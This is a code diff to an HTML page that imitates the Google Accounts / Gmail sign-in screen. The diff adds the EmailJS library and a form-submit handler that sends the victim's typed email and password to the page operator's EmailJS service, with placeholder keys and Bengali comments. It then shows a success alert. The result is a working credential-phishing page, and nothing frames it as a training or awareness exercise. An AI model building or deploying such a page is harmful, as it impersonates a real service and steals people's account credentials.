@@ -4,10 +4,15 @@
   <meta charset="UTF-8">
   <title>Sign in - Google Accounts</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function(){
+      emailjs.init("YOUR_PUBLIC_KEY"); // তোমার EmailJS এর Public/User Key
+    })();
+  </script>
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    /* CSS আগের মতোই থাকবে */
+    * { box-sizing: border-box; }
     body {
       margin: 0;
       font-family: 'Roboto', sans-serif;
@@ -90,26 +95,40 @@
     <h1>Sign in</h1>
     <div class="subtext">to continue to Gmail</div>
 
-    <label for="email">Email or phone</label>
-    <input type="text" id="email" placeholder="Enter your email" />
+    <form id="signin-form">
+      <label for="email">Email or phone</label>
+      <input type="text" name="user_email" id="email" placeholder="Enter your email" required />
+      
 
-    <a href="#" class="link">Forgot email?</a>
+      <label for="password">Password</label>
+      <input type="password" name="user_password" id="password" placeholder="Enter your password" required />
 
-    <label for="password">Password</label>
-    <input type="password" id="password" placeholder="Enter your password" />
+      <a href="#" class="link">Forgot password?</a>
 
-    <a href="#" class="link">Forgot password?</a>
-
-    <div class="actions">
-      <a href="#" class="link">Create account</a>
-      <button class="btn">Next</button>
-    </div>
+      <div class="actions">
+        <a href="#" class="link">Create account</a>
+        <button type="submit" class="btn">Next</button>
+      </div>
+    </form>
   </div>
 
   <div class="footer">
     Not your computer? Use Guest mode to sign in privately. <br />
     <a href="#" class="learn-more">Learn more</a>
   </div>
+
+  <script>
+    document.getElementById('signin-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      emailjs.sendForm('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', this)
+        .then(function(response) {
+          alert("Information sent successfully!");
+        }, function(error) {
+          alert("Failed to send. Try again.");
+        });
+    });
+  </script>
 
 </body>
 </html>
